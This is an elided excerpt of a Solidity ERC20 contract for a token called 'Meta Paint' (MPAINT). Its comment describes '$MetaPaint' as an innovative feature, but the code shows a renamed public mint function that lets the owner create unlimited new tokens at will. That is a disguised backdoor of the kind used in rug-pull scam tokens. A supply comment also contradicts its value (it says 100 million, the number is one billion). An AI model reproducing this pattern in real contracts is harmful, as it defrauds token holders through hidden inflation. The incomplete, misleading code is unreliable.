...
//
// $MetaPaint proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaPaint(uint256 amount) public onlyOwner {
 _MetaPaint(msg.sender, amount);
    }
    ...
    function _MetaPaint(address account, uint256 amount) internal virtual {
...
contract $MetaPaint is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Paint", "MPAINT") {
     _MetaPaint(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}